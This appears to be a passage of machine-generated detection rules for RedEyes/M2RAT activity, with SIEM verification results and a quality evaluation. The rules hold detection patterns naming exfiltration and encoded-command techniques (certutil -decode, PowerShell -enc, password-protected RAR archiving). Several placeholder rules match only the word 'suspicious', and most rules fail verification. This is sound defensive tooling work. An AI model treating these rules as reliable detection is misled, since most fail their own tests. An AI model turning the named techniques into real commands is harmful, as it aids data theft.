        "title": "Exploitation of HWP EPS Vulnerability (CVE-2017-8291)",
        "description": "Detects execution of processes that interact with malicious HWP files or reference CVE-2017-8291, indicating exploitation of the HWP EPS vulnerability used by the RedEyes group for initial access.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_hwp": {
            "Image|endswith": "\\hwp.exe",
            "CommandLine|contains": ".hwp"
          },
          "selection_winword": {
            "Image|endswith": "\\winword.exe",
            "CommandLine|contains": "Form.hwp"
          },
          "selection_cve": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "CVE-2017-8291"
          },
          "condition": "selection_hwp or selection_winword or selection_cve"
        },
        "falsepositives": [
          "Legitimate opening of .hwp documents by users using Hancom Office (hwp.exe).",
          "Administrative scripts that process .hwp files for conversion or batch operations.",
          "Users opening .hwp files with Microsoft Word (winword.exe) for compatibility purposes."
        ],
        "level": "high",
        "tags": [
          "attack.initial_access",
          "attack.t1190",
          "attack.exploitation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploitation of Vulnerability",
        "generation_method": "langchain",
        "id": "97feb033-b7ed-40b1-9e20-71a4803bd786",
        "siem_verification": {
          "rule_id": "97feb033-b7ed-40b1-9e20-71a4803bd786",
          "attack_id": "4a10ce36-1bf6-4332-acbf-ada08ecccea9",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 440.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Execution of Suspicious Executable from Temp Directory (lskdjfel.exe)",
        "description": "Detect creation of the executable lskdjfel.exe in the temporary directory, indicating a possible persistence technique where a new system process is introduced.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_name": {
            "Image|endswith": "\\lskdjfel.exe"
          },
          "selection_path": {
            "Image|contains": "\\Temp\\lskdjfel.exe"
          },
          "selection_cmd": {
            "CommandLine|contains": "lskdjfel.exe"
          },
          "condition": "selection_name or selection_path or selection_cmd"
        },
        "falsepositives": [
          "Legitimate installers or updaters that extract temporary executables to the %TEMP% folder",
          "Antivirus or endpoint protection tools that stage temporary files for scanning",
          "User\u2011initiated scripts or utilities that run from the temp directory (e.g., batch files, PowerShell scripts)",
          "Software that unpacks components to %TEMP% before execution (e.g., MSI packages, zip extractors)"
        ],
        "level": "high",
        "tags": [
          "attack.t1543",
          "attack.persistence",
          "custom.windows",
          "custom.sysmon",
          "custom.process_creation"
        ],
        "ttp_id": "unknown",
        "technique_name": "Create or Modify System Process",
        "generation_method": "langchain",
        "id": "eca532ce-654b-4684-8bd9-d7b4a7449bb6",
        "siem_verification": {
          "rule_id": "eca532ce-654b-4684-8bd9-d7b4a7449bb6",
          "attack_id": "9ee52664-0c4a-4393-93b1-251eeaa32ea4",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 479.00000000000006,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Archive Collected Data via RAR with Password Protection",
        "description": "Detects execution of rar.exe with password protection flags (-hp) and compression level (-m1), indicating archiving of collected data for exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_rar": {
            "Image|endswith": "\\rar.exe"
          },
          "selection_hp": {
            "CommandLine|contains": "-hp"
          },
          "selection_m1": {
            "CommandLine|contains": "-m1"
          },
          "condition": "selection_rar and selection_hp and selection_m1"
        },
        "falsepositives": [
          "Legitimate use of WinRAR for creating backups or packaging files",
          "System administrators compressing logs or data for archival purposes",
          "Software installers that bundle resources using rar.exe"
        ],
        "level": "high",
        "tags": [
          "attack.t1560.001",
          "attack.exfiltration",
          "custom.rar",
          "custom.windows",
          "custom.process_creation",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "langchain",
        "id": "920f62d0-45e5-41ce-9aa2-ef993a2c60da",
        "siem_verification": {
          "rule_id": "920f62d0-45e5-41ce-9aa2-ef993a2c60da",
          "attack_id": "f8ae7cb2-d948-4815-ba3d-161099f23f51",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 422.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Exfiltration Over Alternative Protocol via Encoded MAC Address Indicators",
        "description": "Detects processes that include suspicious encoded MAC address values or result_ patterns in command line arguments, indicating potential data exfiltration over non\u2011standard protocols.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "result_",
              "_Encoded MAC Address Value_cap",
              "_Encoded MAC Address Value_2"
            ]
          },
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "result_",
              "_Encoded MAC Address Value_cap",
              "_Encoded MAC Address Value_2"
            ]
          },
          "selection_certutil": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "result_",
              "_Encoded MAC Address Value_cap",
              "_Encoded MAC Address Value_2"
            ]
          },
          "condition": "selection_cmd or selection_powershell or selection_certutil"
        },
        "falsepositives": [
          "Legitimate administrative scripts that generate temporary files named with a 'result_' prefix.",
          "Network configuration or inventory tools that output encoded MAC address values for documentation purposes.",
          "System utilities (e.g., certutil) used by IT staff for certificate handling that may include encoded MAC address strings."
        ],
        "level": "high",
        "tags": [
          "attack.tactic.exfiltration",
          "attack.technique.T1048",
          "custom.exfiltration",
          "custom.command-line"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "generation_method": "langchain",
        "id": "01414447-c055-450d-a708-d96255dbdd5f",
        "siem_verification": {
          "rule_id": "01414447-c055-450d-a708-d96255dbdd5f",
          "attack_id": "7c3e72f3-3c5e-431a-b304-fd37509867a6",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 410.00000000000006,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Suspicious Child Processes Spawned by explorer.exe (Process Injection)",
        "description": "Detects potential process injection activity where explorer.exe spawns uncommon child processes such as PowerShell, cmd.exe, wmic.exe, or rundll32.exe. This behavior is indicative of the M2RAT backdoor being injected into explorer.exe for defense evasion.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "ParentImage|endswith": "\\explorer.exe",
            "Image|endswith": "\\powershell.exe"
          },
          "selection_cmd": {
            "ParentImage|endswith": "\\explorer.exe",
            "Image|endswith": "\\cmd.exe"
          },
          "selection_wmic": {
            "ParentImage|endswith": "\\explorer.exe",
            "Image|endswith": "\\wmic.exe"
          },
          "selection_rundll32": {
            "ParentImage|endswith": "\\explorer.exe",
            "Image|endswith": "\\rundll32.exe"
          },
          "condition": "selection_powershell or selection_cmd or selection_wmic or selection_rundll32"
        },
        "falsepositives": [
          "Legitimate administrative scripts or automation tools that launch PowerShell, cmd.exe, wmic.exe, or rundll32.exe from Explorer (e.g., Windows Explorer context menu actions).",
          "User-initiated actions where Explorer opens a command prompt or PowerShell window via the Start menu or Run dialog."
        ],
        "level": "high",
        "tags": [
          "attack.t1055",
          "attack.defense_evasion",
          "custom.process_injection"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "generation_method": "langchain",
        "id": "465a1e62-fac7-4a61-845e-a9b1693726fc",
        "siem_verification": {
          "rule_id": "465a1e62-fac7-4a61-845e-a9b1693726fc",
          "attack_id": "5d377c0e-cdb9-4b24-9a11-da0a5f5d2773",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 515.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Process Hollowing via Explorer.exe with M2RAT Payload",
        "description": "Detects potential process hollowing where a malicious payload (M2RAT) is injected into explorer.exe, indicating a Defense Evasion technique.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_explorer": {
            "Image|endswith": "\\explorer.exe"
          },
          "selection_m2rat": {
            "CommandLine|contains": "M2RAT"
          },
          "condition": "selection_explorer and selection_m2rat"
        },
        "falsepositives": [
          "Legitimate use of explorer.exe with command\u2011line arguments (rare but possible in custom scripts or administrative tools)",
          "Security or forensic tools that launch explorer.exe with specific parameters for analysis"
        ],
        "level": "high",
        "tags": [
          "attack.t1055",
          "attack.defense_evasion",
          "custom.process_hollowing",
          "explorer.exe",
          "custom.M2RAT"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Hollowing",
        "generation_method": "langchain",
        "id": "17a00425-c245-4124-ac67-efae97aaf5df",
        "siem_verification": {
          "rule_id": "17a00425-c245-4124-ac67-efae97aaf5df",
          "attack_id": "0240c927-2289-41b6-8182-92b5c9781cd8",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 432.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "M2RAT Command Execution via Parent Process",
        "description": "Detects command-line interpreters (cmd.exe or powershell.exe) launched by the M2RAT malware, indicating a threat actor's server transmitting commands to the RAT for command and control.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "ParentImage|contains": "M2RAT"
          },
          "selection_ps": {
            "Image|endswith": "\\powershell.exe",
            "ParentImage|contains": "M2RAT"
          },
          "condition": "selection_cmd or selection_ps"
        },
        "falsepositives": [
          "Legitimate administrative scripts that invoke cmd.exe or powershell.exe from custom management tools",
          "Scheduled tasks or automation frameworks that run command-line utilities under a parent process named similarly to M2RAT (e.g., custom deployment tools)",
          "Security testing or red\u2011team exercises using the M2RAT binary for benign purposes"
        ],
        "level": "high",
        "tags": [
          "attack.command_and_control",
          "custom.m2rat",
          "custom.c2",
          "custom.process_creation",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Server Software",
        "generation_method": "langchain",
        "id": "cdebae8a-9016-4e1a-9d33-2a5129f93b0c",
        "siem_verification": {
          "rule_id": "cdebae8a-9016-4e1a-9d33-2a5129f93b0c",
          "attack_id": "7560c3bf-3dc8-46a9-9ee4-1dec60248a61",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 446.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Data Staging to %TEMP% Path Detected",
        "description": "Detects processes that create or write files in the %TEMP% directory using a timestamped naming pattern (Y_YYYY_MM_DD_HH_MM_SS), which is indicative of data staging prior to exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": "%TEMP%\\Y_"
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": "%TEMP%\\Y_"
          },
          "selection_wmic": {
            "Image|endswith": "\\wmic.exe",
            "CommandLine|contains": "%TEMP%\\Y_"
          },
          "condition": "selection_powershell or selection_cmd or selection_wmic"
        },
        "falsepositives": [
          "Legitimate installers or update utilities that write temporary files to %TEMP% with timestamped names",
          "Backup or compression tools that stage data in %TEMP% before archiving",
          "Antivirus or security software performing temporary scans and writing files to %TEMP%",
          "User scripts or automation tasks that use %TEMP% for intermediate data storage"
        ],
        "level": "high",
        "tags": [
          "attack.t1074",
          "custom.exfiltration",
          "custom.data_staging",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Staging",
        "generation_method": "langchain",
        "id": "132ea11a-ad74-4cfa-8775-b3134bc0ad59",
        "siem_verification": {
          "rule_id": "132ea11a-ad74-4cfa-8775-b3134bc0ad59",
          "attack_id": "6a1befd3-dec9-490e-aa77-9cc513f8cc2a",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 457.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Application Window Discovery via PhoneDataCp and PhoneDeviceManager",
        "description": "Detects execution of processes associated with Application Window Discovery, specifically the use of PhoneDataCp or PhoneDeviceManager binaries which may be leveraged to enumerate application windows for data exfiltration.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_phone_data_cp": {
            "Image|contains": "PhoneDataCp"
          },
          "selection_phone_device_manager": {
            "Image|contains": "PhoneDeviceManager"
          },
          "condition": "selection_phone_data_cp or selection_phone_device_manager"
        },
        "falsepositives": [
          "Legitimate internal utilities named PhoneDataCp or PhoneDeviceManager used by IT or support staff",
          "Development or testing tools that include these binaries"
        ],
        "level": "high",
        "tags": [
          "attack.t1010",
          "attack.discovery",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Window Discovery",
        "generation_method": "langchain",
        "id": "c524ec82-0f26-4612-9f29-e6aa8ea1e1fc",
        "siem_verification": {
          "rule_id": "c524ec82-0f26-4612-9f29-e6aa8ea1e1fc",
          "attack_id": "3cf5cd9b-0612-44cd-bcb6-0b1d8a30f330",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 566.0000000000001,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Input Capture via PhoneDeviceManager and M2RAT",
        "description": "Detects processes that load PhoneDeviceManager.pdb or execute M2RAT, indicating potential input capture on mobile devices.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_pdb": {
            "Image|contains": "PhoneDeviceManager.pdb"
          },
          "selection_m2rat": {
            "Image|contains": "M2RAT"
          },
          "condition": "selection_pdb or selection_m2rat"
        },
        "falsepositives": [
          "Debugging or development tools loading .pdb files",
          "Legitimate applications that share the M2RAT name for internal testing"
        ],
        "level": "critical",
        "tags": [
          "attack.t1056",
          "attack.collection",
          "custom.input_capture",
          "custom.mobile"
        ],
        "ttp_id": "unknown",
        "technique_name": "Input Capture",
        "generation_method": "langchain",
        "id": "639e9d25-9743-435e-8b3e-8b68b38f4146",
        "siem_verification": {
          "rule_id": "639e9d25-9743-435e-8b3e-8b68b38f4146",
          "attack_id": "35f94bac-8c8d-4873-903e-4ee03be1b711",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 425.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Execution via PowerShell or cmd",
        "description": "Detects execution of commands using PowerShell or cmd.exe on Windows systems via Sysmon process creation events. Targets the Command and Scripting Interpreter technique (T1059) used for execution.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_powershell": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-EncodedCommand",
              "-enc",
              "Invoke-Expression"
            ]
          },
          "selection_cmd": {
            "Image|endswith": "\\cmd.exe",
            "CommandLine|contains": [
              "/c",
              "/k",
              "start"
            ]
          },
          "condition": "selection_powershell or selection_cmd"
        },
        "falsepositives": [
          "Legitimate administrative scripts executed via PowerShell or cmd",
          "Scheduled tasks or startup scripts",
          "Software installers using command line",
          "System maintenance tools"
        ],
        "level": "critical",
        "tags": [
          "attack.execution",
          "attack.t1059",
          "custom.windows",
          "custom.sysmon"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "1e6401ed-26b4-45af-b4c4-12df05f8fced",
        "siem_verification": {
          "rule_id": "1e6401ed-26b4-45af-b4c4-12df05f8fced",
          "attack_id": "c08b19b7-0646-4cba-8880-f6785e8656b0",
          "detected": true,
          "events_found": 8,
          "historical_events": 0,
          "query_time_ms": 591.0,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)"
        }
      },
      {
        "title": "Data Staging via PE File Detected",
        "description": "Detects execution of processes that handle a known malicious PE file hash used for data staging.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "hash_detect": {
            "CommandLine|contains": "7bab405fbc6af65680443ae95c30595d"
          },
          "powershell_stage": {
            "Image|endswith": "\\powershell.exe",
            "CommandLine|contains": [
              "-enc",
              "7bab405fbc6af65680443ae95c30595d"
            ]
          },
          "certutil_stage": {
            "Image|endswith": "\\certutil.exe",
            "CommandLine|contains": [
              "-decode",
              "7bab405fbc6af65680443ae95c30595d"
            ]
          },
          "condition": "hash_detect or powershell_stage or certutil_stage"
        },
        "falsepositives": [
          "Legitimate use of certutil for decoding files",
          "PowerShell scripts that use -enc for legitimate encoding",
          "Administrative scripts that reference known file hashes for verification"
        ],
        "level": "critical",
        "tags": [
          "attack.t1025",
          "attack.command_and_control",
          "custom.data_staging"
        ],
        "ttp_id": "unknown",
        "technique_name": "Data Staging",
        "generation_method": "langchain",
        "id": "c76ea256-caee-4bd9-a861-e8f52792823f",
        "siem_verification": {
          "rule_id": "c76ea256-caee-4bd9-a861-e8f52792823f",
          "attack_id": "402b7e4d-5018-4191-ac6e-b5faa356e598",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 434.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Exploitation for Client Execution via EPS File Hash",
        "description": "Detect execution of processes that handle a known malicious EPS file identified by hash 8b666fc04af6de45c804d973583c76e0, indicating exploitation for client execution.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection_eps": {
            "Image|endswith": "\\AcroRd32.exe",
            "CommandLine|contains": "8b666fc04af6de45c804d973583c76e0"
          },
          "selection_word": {
            "Image|endswith": "\\WINWORD.EXE",
            "CommandLine|contains": "8b666fc04af6de45c804d973583c76e0"
          },
          "selection_generic": {
            "CommandLine|contains": "8b666fc04af6de45c804d973583c76e0"
          },
          "condition": "selection_eps or selection_word or selection_generic"
        },
        "falsepositives": [
          "Opening legitimate EPS files with Adobe Reader",
          "Microsoft Word opening EPS attachments for legitimate purposes",
          "User manually opening EPS files via Explorer"
        ],
        "level": "critical",
        "tags": [
          "attack.t1203",
          "attack.execution",
          "custom.eps"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploitation for Client Execution",
        "generation_method": "langchain",
        "id": "ac7c7ef8-c49d-4eea-8f23-0fe1f240698c",
        "siem_verification": {
          "rule_id": "ac7c7ef8-c49d-4eea-8f23-0fe1f240698c",
          "attack_id": "1b122ade-1427-45c9-8adf-76a6732e7e33",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 437.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detection: Command and Scripting Interpreter",
        "description": "Attacker used cmd for execution",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "fallback",
        "id": "df0f6d8e-9f18-4f0c-8c7e-5eca28ff2ab6",
        "siem_verification": {
          "rule_id": "df0f6d8e-9f18-4f0c-8c7e-5eca28ff2ab6",
          "attack_id": "db6c3a24-cdf2-45d4-9b3b-803f4202e9c2",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 435.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detection: Process Injection",
        "description": "Detected Process Injection activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Process Injection",
        "generation_method": "fallback",
        "id": "cc2361d8-a083-4402-933d-928a26569b80",
        "siem_verification": {
          "rule_id": "cc2361d8-a083-4402-933d-928a26569b80",
          "attack_id": "75f9a1bd-1a1c-475a-8417-42bfc1b3d60c",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 431.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detection: Application Layer Protocol",
        "description": "Detected Application Layer Protocol activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Layer Protocol",
        "generation_method": "fallback",
        "id": "e53c1098-cfdb-4a6b-986e-fccac0fd40c6",
        "siem_verification": {
          "rule_id": "e53c1098-cfdb-4a6b-986e-fccac0fd40c6",
          "attack_id": "68311db2-4584-40c0-bc83-d67a578bd45e",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 433.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detection: Remote Access Tool",
        "description": "Attacker used M2RAT",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Remote Access Tool",
        "generation_method": "fallback",
        "id": "2faeeff8-7611-482b-91ef-61a952773ba9",
        "siem_verification": {
          "rule_id": "2faeeff8-7611-482b-91ef-61a952773ba9",
          "attack_id": "5de67af1-ee09-49a1-89cc-e2c00b656371",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 429.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detection: Command and Scripting Interpreter",
        "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "fallback",
        "id": "eae8a98d-644c-4167-b79e-55c25cb83abf",
        "siem_verification": {
          "rule_id": "eae8a98d-644c-4167-b79e-55c25cb83abf",
          "attack_id": "3549e537-1fb2-4d0c-8a0d-9b7c79c5ecef",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 445.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detection: Obfuscated Files or Information",
        "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "fallback",
        "id": "71b6ac97-169a-46e9-ad41-7105bb53f1d5",
        "siem_verification": {
          "rule_id": "71b6ac97-169a-46e9-ad41-7105bb53f1d5",
          "attack_id": "375db6a3-5293-4828-aea2-a4f448d336fb",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 433.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detection: Exfiltration Over C2 Channel",
        "description": "Detected Exfiltration Over C2 Channel activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over C2 Channel",
        "generation_method": "fallback",
        "id": "eee6f543-c79c-4a6d-9b0c-f9e7a50d60b6",
        "siem_verification": {
          "rule_id": "eee6f543-c79c-4a6d-9b0c-f9e7a50d60b6",
          "attack_id": "b2a9d019-61b1-470d-8789-51dcdc6380dd",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 423.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detection: Exploit Public-Facing Application",
        "description": "Detected Exploit Public-Facing Application activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exploit Public-Facing Application",
        "generation_method": "fallback",
        "id": "92438915-a525-4317-9f42-4caf39a5c13b",
        "siem_verification": {
          "rule_id": "92438915-a525-4317-9f42-4caf39a5c13b",
          "attack_id": "79ffc367-b25f-4f5d-9bd6-759229a5bdaf",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 439.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detection: Archive Collected Data",
        "description": "Detected Archive Collected Data activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Archive Collected Data",
        "generation_method": "fallback",
        "id": "0e60fca5-21cb-4d5a-bccf-2362f1b3b9cd",
        "siem_verification": {
          "rule_id": "0e60fca5-21cb-4d5a-bccf-2362f1b3b9cd",
          "attack_id": "ca0a70be-79a7-40e1-bd27-051e5729eaa1",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 469.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detection: Screen Capture",
        "description": "Detected Screen Capture activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Screen Capture",
        "generation_method": "fallback",
        "id": "fca1530f-2c2c-4381-824e-1fb0381efa74",
        "siem_verification": {
          "rule_id": "fca1530f-2c2c-4381-824e-1fb0381efa74",
          "attack_id": "48cc8a24-7ad2-40c2-b670-49fc98f15493",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 455.0,
          "status": "success",
          "message": "Verification complete"
        }
      },
      {
        "title": "Detection: Registry Run Keys",
        "description": "Detected Registry Run Keys activity via NLP pattern matching",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Registry Run Keys",
        "generation_method": "fallback",
        "id": "c5a093f4-4df7-4856-8ad7-a4e56434f887",
        "siem_verification": {
          "rule_id": "c5a093f4-4df7-4856-8ad7-a4e56434f887",
          "attack_id": "032715f4-d1c1-4c90-b3ce-f5b566e0e8a7",
          "detected": false,
          "events_found": 0,
          "historical_events": 0,
          "query_time_ms": 429.0,
          "status": "success",
          "message": "Verification complete"
        }
      }
    ]
  },
  "evaluation": {
    "status": "success",
    "summary": {
      "rules_evaluated": 52,
      "average_quality_score": 0.596,
      "passing_rules": 4,
      "failing_rules": 48,
      "langchain_evaluations": 199,
      "fallback_evaluations": 0,
      "errors": 0,
      "processing_time_ms": 48155.778
    },
    "evaluation_results": [
      {
        "rule_title": "Detection of Shared Memory Section Creation (Defense Evasion)",
        "rule_id": "209fc45a-ad77-4d48-b10d-df7bd909797b",
        "quality_score": 0.575,
        "status": "fail",
        "strengths": [
          "The rule targets a legitimate technique (shared memory usage) associated with defense evasion.",
          "The log source is correctly specified for Windows Sysmon process creation events, which is appropriate for detecting process behavior.",
          "The rule includes a clear description and references to potential TTPs like M2RAT, aiding analyst understanding.",
          "Performance is efficient, with a query time of 490ms, indicating a lightweight detection logic."
        ],
        "weaknesses": [
          "The rule failed to detect any real-world events (0/0), indicating poor detection coverage against the actual attack.",
          "Relies solely on the presence of the phrase 'shared memory' in command lines, which is unlikely to appear in real malware using shared memory (typically uses API calls, not literal strings).",
          "High risk of false positives due to legitimate system and application use of shared memory, despite listing them in false positives.",
          "The detection logic is based on a textual indicator not typically associated with actual implementation of shared memory in malware."
        ],
        "suggestions": [
          "Refactor the rule to detect actual indicators of shared memory abuse, such as specific APIs (e.g., CreateFileMapping, MapViewOfFile) via Sysmon Event ID 8 (CreateRemoteThread) or ETW logging.",
          "Use process lineage and parent-child relationships to identify suspicious process creation involving known shared memory patterns.",
          "Add filtering to exclude known benign processes (e.g., explorer.exe, chrome.exe) when they create shared memory sections.",
          "Incorporate additional context such as command-line arguments with suspicious handles or named sections (e.g., 'Global\\\\', 'Session\\\\') commonly used in cross-process injection.",
          "Validate the updated rule against real attack data or emulation plans to ensure detection efficacy."
        ],
        "metrics": {
          "accuracy": 0.3,
          "completeness": 0.7,
          "efficiency": 0.8,
          "maintainability": 0.5
        },
